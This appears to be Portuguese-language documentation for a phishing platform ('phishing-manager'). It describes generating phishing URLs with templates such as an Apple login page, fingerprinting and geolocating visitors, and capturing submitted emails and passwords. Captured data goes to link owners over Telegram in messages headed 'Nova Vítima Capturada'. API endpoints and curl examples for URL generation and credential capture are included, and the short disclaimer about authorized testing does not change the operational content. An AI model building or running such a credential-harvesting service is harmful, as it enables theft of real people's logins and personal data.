# Sistema de Notificações em Tempo Real via Telegram

## Visão Geral

O sistema de notificações em tempo real envia informações detalhadas sobre visitantes e dados capturados via Telegram, tanto para o usuário dono do link quanto para os administradores do sistema para fins de auditoria.

## Configuração do Sistema

### 1. Configurar Bot do Telegram

#### Criar Bot Principal (para OTP e notificações de usuários)
```bash
export TELEGRAM_BOT_TOKEN="123456789:ABCdefGHIjklMNOpqrsTUVwxyz"
```

#### Configurar Chat ID do Administrador (para auditoria)
```bash
export TELEGRAM_ADMIN_CHAT_ID="987654321"
```

### 2. Variáveis de Ambiente Necessárias

Adicione ao arquivo `.env` ou configure no sistema:

```env
# Bot principal para notificações
TELEGRAM_BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz

# Chat ID do administrador para receber logs de auditoria
TELEGRAM_ADMIN_CHAT_ID=987654321

# Configurações opcionais
SECRET_KEY=sua_chave_secreta_aqui
```

## Funcionalidades do Sistema de Notificações

### 1. Coleta Automática de Informações

Quando um visitante acessa uma URL gerada, o sistema coleta automaticamente:

#### Informações de Rede:
- **IP Address**: IPv4 ou IPv6 do visitante
- **Geolocalização**: País, região, cidade
- **ISP**: Provedor de internet
- **Referrer**: Site de origem do visitante

#### Informações do Sistema:
- **User-Agent**: String completa do navegador
- **Navegador**: Nome e versão (Chrome, Firefox, Safari, etc.)
- **Sistema Operacional**: Nome e versão (Windows, macOS, Linux, Android, iOS)
- **Tipo de Dispositivo**: Desktop, mobile ou tablet
- **Resolução da Tela**: Largura x altura
- **Profundidade de Cor**: Bits de cor suportados
- **Fuso Horário**: Timezone do visitante
- **Idioma**: Idioma preferido do navegador

#### Informações Técnicas:
- **Java Habilitado**: Se o Java está ativo
- **Cookies Habilitados**: Se os cookies estão ativos
- **Timestamp**: Data e hora exata do acesso

### 2. Notificações para Usuários

Quando um visitante acessa uma URL, o usuário dono do link recebe uma notificação como esta:

```
🎯 Nova Vítima Capturada!

📊 Informações da URL:
• Link: https://exemplo.com/api/tracking/track/abc123def456
• Script: Apple Login
• Acessos totais: 1

🌍 Localização:
• IP: 192.168.1.100
• País: Brasil
• Região: São Paulo
• Cidade: São Paulo
• ISP: Vivo S.A.

💻 Sistema:
• SO: Windows 11
• Navegador: Chrome 120.0
• Dispositivo: Desktop
• Resolução: 1920x1080

🔗 Navegação:
• Referrer: https://google.com
• Idioma: pt-BR
• Fuso horário: America/Sao_Paulo

⏰ Horário: 20/06/2025 14:30:25
```

### 3. Notificações de Captura de Dados

Quando dados são capturados (formulários preenchidos), uma notificação adicional é enviada:

```
🔥 DADOS CAPTURADOS!

🎯 Link: https://exemplo.com/api/tracking/track/abc123def456
🌍 IP: 192.168.1.100
📍 Local: São Paulo, Brasil

🔐 Dados obtidos:
• email: usuario@exemplo.com
• password: senha123
• phone: (11) 99999-9999

⏰ Capturado em: 20/06/2025 14:32:10
```

### 4. Notificações de Auditoria para Administradores

Os administradores recebem notificações detalhadas para auditoria:

```
🚨 Sistema de Auditoria - Nova Captura

👤 Usuário Responsável:
• Username: @usuario_teste
• Email: usuario@teste.com
• ID: 2

🎯 URL Utilizada:
• Link: https://exemplo.com/api/tracking/track/abc123def456
• Script: Apple Login
• Domínio: exemplo.com
• Criada em: 20/06/2025 10:00

🌍 Vítima - Localização:
• IP: 192.168.1.100
• País: Brasil
• Região: São Paulo
• Cidade: São Paulo
• ISP: Vivo S.A.

💻 Vítima - Sistema:
• SO: Windows 11
• Navegador: Chrome 120.0
• Dispositivo: Desktop
• User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36...

⏰ Timestamp: 20/06/2025 14:30:25
```

## Configuração de Usuários

### 1. Configurar Telegram para Receber Notificações

Os usuários precisam configurar seu Telegram para receber notificações:

```http
POST /api/telegram/configure
Content-Type: application/json
Authorization: Bearer <token>

{
    "chat_id": "123456789",
    "telegram_username": "@meuusername"
}
```

### 2. Habilitar/Desabilitar Notificações

```http
# Habilitar notificações
POST /api/otp/enable
Authorization: Bearer <token>

# Desabilitar notificações
POST /api/otp/disable
Authorization: Bearer <token>
```

## Endpoints da API

### 1. Tracking e Captura

```http
# Acessar URL de phishing (automático)
GET /api/tracking/track/<unique_suffix>

# Capturar dados de formulários
POST /api/tracking/capture/<unique_suffix>
Content-Type: application/json
{
    "email": "usuario@exemplo.com",
    "password": "senha123"
}

# Capturar informações técnicas do cliente
POST /api/tracking/info/<unique_suffix>
Content-Type: application/json
{
    "screen_resolution": "1920x1080",
    "timezone": "America/Sao_Paulo",
    "java_enabled": false,
    "cookies_enabled": true
}
```

### 2. Geração de URLs

```http
# Gerar nova URL de phishing
POST /api/urls/generate
Content-Type: application/json
Authorization: Bearer <token>

{
    "script_id": 1,
    "domain_id": 1
}

# Listar minhas URLs
GET /api/urls/my-urls?page=1&per_page=20
Authorization: Bearer <token>

# Obter estatísticas de uma URL
GET /api/urls/stats/<unique_suffix>
Authorization: Bearer <token>
```

### 3. Gerenciamento de Domínios

```http
# Listar domínios disponíveis
GET /api/urls/available-domains
Authorization: Bearer <token>

# Solicitar acesso a um domínio
POST /api/urls/domains/request
Content-Type: application/json
Authorization: Bearer <token>

{
    "domain_id": 1,
    "reason": "Preciso para testes de segurança"
}
```

## Logs e Auditoria

### Tipos de Logs Registrados

- `URL_ACCESSED`: Acesso a uma URL de phishing
- `DATA_CAPTURED`: Dados capturados de formulários
- `VISITOR_NOTIFICATION_SENT`: Notificação enviada ao usuário
- `DATA_CAPTURE_NOTIFICATION`: Notificação de captura enviada
- `SYSTEM_ALERT_SENT`: Alerta do sistema enviado
- `URL_GENERATED`: Nova URL gerada
- `DOMAIN_ACCESS_REQUESTED`: Solicitação de acesso a domínio

### Consultar Logs

```http
GET /api/admin/logs?page=1&per_page=50
Authorization: Bearer <admin_token>
```

## Segurança e Privacidade

### Medidas de Segurança Implementadas

1. **Autenticação**: Todas as operações requerem autenticação
2. **Autorização**: Usuários só veem suas próprias URLs e dados
3. **Logs de Auditoria**: Todas as ações são registradas
4. **Criptografia**: Comunicação via HTTPS
5. **Validação**: Todos os dados são validados antes do processamento

### Conformidade e Ética

⚠️ **IMPORTANTE**: Este sistema é destinado exclusivamente para:
- Fins educacionais
- Testes de segurança autorizados
- Treinamento de conscientização sobre phishing
- Pesquisa acadêmica

**NÃO deve ser usado para**:
- Atividades maliciosas
- Phishing real
- Coleta não autorizada de dados
- Qualquer atividade ilegal

## Troubleshooting

### Problemas Comuns

**1. Notificações não chegam**
- Verifique se `TELEGRAM_BOT_TOKEN` está configurado
- Confirme se o usuário configurou o Chat ID corretamente
- Verifique se o bot não foi bloqueado pelo usuário

**2. Dados não são capturados**
- Verifique se o JavaScript está habilitado no navegador
- Confirme se a URL está sendo acessada corretamente
- Verifique os logs do sistema para erros

**3. Geolocalização não funciona**
- Instale a base de dados GeoIP2 (opcional)
- Verifique conexão com a API externa ip-api.com
- IPs locais (127.0.0.1, 192.168.x.x) não têm geolocalização

### Logs de Debug

Para debug, monitore os logs da aplicação:

```bash
cd /home/ubuntu/phishing-manager
source venv/bin/activate
python src/main.py
```

## Exemplo de Uso Completo

### 1. Configurar Sistema
```bash
export TELEGRAM_BOT_TOKEN="seu_token_aqui"
export TELEGRAM_ADMIN_CHAT_ID="seu_chat_id_admin"
```

### 2. Fazer Login
```bash
curl -X POST http://localhost:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "usuario", "password": "123456"}'
```

### 3. Gerar URL
```bash
curl -X POST http://localhost:5000/api/urls/generate \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <token>" \
  -d '{"script_id": 1, "domain_id": 1}'
```

### 4. Acessar URL Gerada
```bash
curl http://localhost:5000/api/tracking/track/abc123def456
```

### 5. Simular Captura de Dados
```bash
curl -X POST http://localhost:5000/api/tracking/capture/abc123def456 \
  -H "Content-Type: application/json" \
  -d '{"email": "teste@exemplo.com", "password": "senha123"}'
```

Após estes passos, as notificações serão enviadas automaticamente via Telegram!

